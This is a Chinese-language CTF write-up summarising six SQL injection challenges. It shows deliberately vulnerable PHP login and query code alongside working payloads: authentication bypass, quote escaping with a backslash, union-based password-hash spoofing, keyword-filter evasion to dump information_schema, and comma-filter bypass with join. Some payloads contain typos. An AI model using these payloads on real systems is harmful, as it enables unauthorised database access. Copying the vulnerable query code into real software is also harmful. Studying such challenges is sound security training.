# sql注入做题总结

### 1.CG-CTF:MYSQL
```php
<?php
  $id = intval($_GET[id]);
  $query = @mysql_fetch_array(mysql_query("select content from ctf2 where id='$id'"));
  if ($_GET[id]==1024) {
      echo "<p>no! try again</p>";
  }
  else{
    echo($query[content]);
  }
}
?>
```
    wp：精度问题，id=1024.1得到flag
    
### 2.CG-CTF:SQL注入1
```php
if($_POST[user] && $_POST[pass]) {
    mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $user = trim($_POST[user]);
  $pass = md5(trim($_POST[pass]));
  $sql="select user from ctf where (user='".$user."') and (pw='".$pass."')";
    echo '</br>'.$sql;
  $query = mysql_fetch_array(mysql_query($sql));
  if($query[user]=="admin") {
      echo "<p>Logged in! flag:******************** </p>";
  }
  if($query[user] != "admin") {
    echo("<p>You are not admin!</p>");
  }
}
echo $query[user];
?>
```
    wp:直接构造and 1 = 1的结构，注意需要替代空格
    user=admin')/**/and/**/1=1#&pass=123
    
### 3.CG-CTF:SQLInjection
```php
<?php
function clean($str){
  if(get_magic_quotes_gpc()){
    $str=stripslashes($str);
  }
  return htmlentities($str, ENT_QUOTES);
}
$username = @clean((string)$_GET['username']);
$password = @clean((string)$_GET['password']);

$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''   .$password.'\';';
?>
```
    wp:clean函数将’和“过滤了所以重点就是将username后面的'转义
    payload为?username=admin \&password=or 1=1#
    这样构造的语句就成了select * from users where name=' admin \' and pass=' or 1=1#';
    也就是把name字段变成了 admin ' and pass=
    整个语句最后理解为select * from users where name=***** or 1=1;
    这样不管查询了什么名称，都是为真的语句。也就是把数据表中的所有数据全部查出
    
### 4.CG-CTF:SQL注入2

```php
<?php
if($_POST[user] && $_POST[pass]) {
   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $user = $_POST[user];
  $pass = md5($_POST[pass]);
  $query = @mysql_fetch_array(mysql_query("select pw from ctf where user='$user'"));
  if (($query[pw]) && (!strcasecmp($pass, $query[pw]))) {
      echo "<p>Logged in! Key: ntcf{**************} </p>";
  }
  else {
    echo("<p>Log in failure!</p>");
  }
}
?>
```

    wp:没有任何过滤，sql语句的用法是将pw从表ctf中取出，在mysql中，当你使用了union语句，而联合查询前的语句返回空，
    则后面的语句的结果就会等于前面字段。
    如select pw from ctf where name='' union select '值';
    那么返回的结果为：pw=值；
    所以payload:user='union select "md(str)"--+&pass=str
    
### 5.百度杯九月场：SQL

    题目为int型注入，过滤了or和and和select，可以使用<>过滤
    payload:id=o<>rder by 3   知道字段为3
    id=union sele<>ct 1,schema_name,3 from info<>rmaton_schema.schemata得到数据库名sqli
    id=union sel<>ect 1,table_name,3 from info<>rmation.tables where table_schema='sqli' 得到表info
    id=union sele<>ct 1,column_name,3 from info<>rmation.columns where table_name='info'得到字段flAg_T5ZNdrm
    id=union sel<>ect 1,flAg_T5ZNdrm,3 from sqli.info得到flag{6b453f35-bc6b-41a4-852c-75a40b003bd1}

### 6.百度杯九月场：SQLI
    
    这题是逗号过滤
    输入 union select 1,2 %23时回显 1'union select 1猜测为逗号过滤，使用join绕过过滤
    join语句:
       select 字段1，字段2 from 表名 where id=xxx union select * from (select 1) a join (select 2) b；
    多少个字段就select多少个，这题通过order by得知查询了2个字段，所以有2个select。
    a和b分别为select 1 和select 2的别名
    若前面id为-1，则查询结果中为空，则显示union后面的数据
    payload:id=-1' union select * from (select 1) a join (select 2) b %23
    回显2则可以在2处插入查询语句。后略
